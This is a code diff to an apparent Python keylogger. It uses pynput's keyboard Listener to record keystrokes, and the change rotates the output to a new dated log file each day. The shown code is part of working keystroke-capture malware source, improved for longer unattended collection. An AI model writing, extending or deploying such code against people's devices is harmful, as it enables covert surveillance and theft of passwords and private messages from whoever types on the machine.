@@ -1,4 +1,21 @@
 from pynput.keyboard import Listener, Key
+from datetime import datetime
+
+# Global variable to store the current log file name
+current_log_file = None
+
+
+def get_log_file():
+    """Generates or retrieves the current log file based on today's date."""
+    global current_log_file
+    today_date = datetime.now().strftime('%Y-%m-%d')  # Get today's date in YYYY-MM-DD format
+    log_filename = f"log_{today_date}.txt"
+
+    # If the log file is not set yet or the date has changed, update it
+    if current_log_file != log_filename:
+        current_log_file = log_filename
+
+    return current_log_file
 
 
 def writeToFile(key):
@@ -60,8 +77,11 @@ def writeToFile(key):
             # For normal keys, we remove the surrounding single quotes
             letter = str(key).replace("'", "")
 
+        # Get the current log file based on today's date
+        log_file = get_log_file()
+
         # Append the key press to the log file
-        with open("log.txt", 'a') as f:
+        with open(log_file, 'a') as f:
             f.write(letter)
     except Exception as e:
         print(f"Error: {e}")
